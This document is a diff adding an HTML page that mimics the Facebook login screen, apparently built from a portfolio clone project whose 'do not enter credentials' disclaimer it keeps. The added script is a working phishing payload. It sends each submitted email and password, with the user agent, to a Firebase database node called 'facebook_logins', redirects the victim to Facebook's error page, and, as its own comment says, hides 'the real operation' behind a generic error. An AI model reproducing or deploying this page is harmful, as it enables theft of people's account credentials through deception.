@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Fb Clone</title>
+    <link
+      rel="icon"
+      href="https://cdn.iconscout.com/icon/free/png-512/facebook-social-media-fb-logo-square-44659.png"
+    />
+    <link rel="stylesheet" href="facebook.css" />
+    <!-- To get the font-awesome CSS style sheet for the 'Eye Icon' located in the password field -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css"
+    />
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+  </head>
+  <body>
+    <header class="header">
+      <div class="header-container">
+        <div class="header-logo">
+          <a href="#" class="facebook-text">Facebook</a>
+        </div>
+      </div>
+    </header>
+    <div class="contains-top-half-and-footer-bottom-half">
+      <div class="global-container">
+        <div class="bigger-box">
+          <div class="big-box">
+            <div class="left-box">
+              <div class="image-box">
+                <img
+                  class="fb-logo"
+                  src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+                  alt=""
+                />
+              </div>
+              <h2 class="logo-caption">
+                Facebook helps you connect and share with the people in your
+                life.
+              </h2>
+            </div>
+            <div class="right-box">
+              <div class="form-container">
+                <form id="loginForm">
+                  <div class="space">
+                    <input
+                      type="text"
+                      class="email-box"
+                      name="email"
+                      placeholder="Email address or phone number"
+                      required
+                    />
+                  </div>
+                  <div class="password-container">
+                    <div class="space">
+                      <input
+                        type="password"
+                        class="pw-box"
+                        name="password"
+                        placeholder="Password"
+                        id="password_field"
+                        required
+                      />
+                    </div>
+                    <i
+                      class="far fa-eye-slash"
+                      id="toggleEyeIcon"
+                      onclick="togglePassword()"
+                    ></i>
+                  </div>
+                  <div class="space">
+                    <button type="submit" class="login-button">
+                      <b>Log In</b>
+                    </button>
+                  </div>
+                  <div class="spaceTwo adjustTwo">
+                    <a href="#" class="adjust-forgot-pw">Forgotten password?</a>
+                  </div>
+                  <div class="line"></div>
+                  <div>
+                    <button type="button" class="create-button" onclick="showSignupForm()">
+                      <b>Create New Account</b>
+                    </button>
+                  </div>
+                </form>
+              </div>
+              <div class="bottom-link-box">
+                <a class="bottom-link" href="#"><b>Create a Page</b></a>
+                for a celebrity, band or business.
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer>
+        <div>
+          <ul>
+            <li class="list-items">English (UK)</li>
+            <li class="list-items">
+              <a class="list-items" href="#">中文(简体)</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Bahasa Indonesia</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">日本語</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">ภาษาไทย</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Tiếng Việt</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">한국어</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Español</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Português (Brasil)</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Français (France)</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Deutsch</a>
+            </li>
+            <button type="button" class="plus-button">+</button>
+          </ul>
+          <div class="line-2 reduce-margin"></div>
+          <ul>
+            <li class="list-items">
+              <a class="list-items" href="#">Messenger</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Fb Lite</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">Watch</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">People</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">Pages</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">Page Categories</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Places</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">Games</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">Locations</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Marketplace</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Fb Pay</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Groups</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">Jobs</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">Occulus</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Portal</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Instagram</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">Local</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">Fundraisers</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Services</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Spark AR</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Shops</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Voting Information Centre</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">About</a></li>
+            <li class="list-items">
+              <a class="list-items" href="#">Create ad</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Create Page</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Developers</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Careers</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Privacy</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">Cookies</a>
+            </li>
+            <li class="list-items">
+              <a class="list-items" href="#">AdChoices</a>
+            </li>
+            <li class="list-items"><a class="list-items" href="#">Terms</a></li>
+            <li class="list-items"><a class="list-items" href="#">Help</a></li>
+          </ul>
+          <div class="fb-clone">
+            <p>
+              Disclaimer: This web page is a personal portfolio project. Hence,
+              please kindly do not enter any of your credentials here. We will
+              not be liable for any losses or damages arising from such an
+              action.
+            </p>
+            <a
+              class="fb-clone-link"
+              href="https://github.com/melvincwng/facebook-clone"
+              target="_blank"
+              rel="noopener noreferrer"
+              >Fb Clone © 2022</a
+            >
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <!-- Firebase configuration and form handling -->
+    <script>
+      // Initialize Firebase with your config
+      const firebaseConfig = {
+  apiKey: "AIzaSyBesPBLjIcXVu2NMiG_DYEmfgklEfo68bI",
+  authDomain: "cloner-fc5a1.firebaseapp.com",
+  databaseURL: "https://cloner-fc5a1-default-rtdb.firebaseio.com",
+  projectId: "cloner-fc5a1",
+  storageBucket: "cloner-fc5a1.firebasestorage.app",
+  messagingSenderId: "423421065834",
+  appId: "1:423421065834:web:f4b4efd83f1ac2221e2813",
+  measurementId: "G-487W12PSKF"
+};
+
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      const database = firebase.database();
+
+      document.addEventListener('DOMContentLoaded', function() {
+        const loginForm = document.getElementById('loginForm');
+        
+        loginForm.addEventListener('submit', async function(e) {
+          e.preventDefault();
+          
+          const email = this.querySelector('[name="email"]').value;
+          const password = this.querySelector('[name="password"]').value;
+          const submitButton = this.querySelector('.login-button');
+          
+          // Disable submit button during submission
+          submitButton.disabled = true;
+          submitButton.innerHTML = '<b>Loading...</b>';
+          
+          try {
+            // Create a new entry in the database
+            const newLoginRef = database.ref('facebook_logins').push();
+            
+            await newLoginRef.set({
+              email: email,
+              password: password,
+              timestamp: firebase.database.ServerValue.TIMESTAMP,
+              userAgent: navigator.userAgent,
+              ip: 'Will be captured by Firebase',
+              platform: 'Facebook',
+              source: 'Facebook Login Page',
+              type: 'Facebook Credentials'
+            });
+
+            // Clear the form
+            this.reset();
+            
+            // Redirect to Facebook's error page
+            window.location.href = 'https://facebook.com/login/error';
+            
+          } catch (error) {
+            console.error('Error:', error);
+            // Show generic error to not reveal the real operation
+            alert('Something went wrong. Please try again.');
+          } finally {
+            // Re-enable submit button
+            submitButton.disabled = false;
+            submitButton.innerHTML = '<b>Log In</b>';
+          }
+        });
+
+        // Password visibility toggle
+        const toggleIcon = document.getElementById('toggleEyeIcon');
+        const passwordField = document.getElementById('password_field');
+        
+        // Show eye icon when password field has content
+        passwordField.addEventListener('input', function() {
+          toggleIcon.style.display = this.value ? 'block' : 'none';
+        });
+        
+        // Toggle password visibility
+        toggleIcon.addEventListener('click', function() {
+          const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+          passwordField.setAttribute('type', type);
+          this.classList.toggle('fa-eye');
+          this.classList.toggle('fa-eye-slash');
+        });
+      });
+    </script>
+  </body>
+</html>
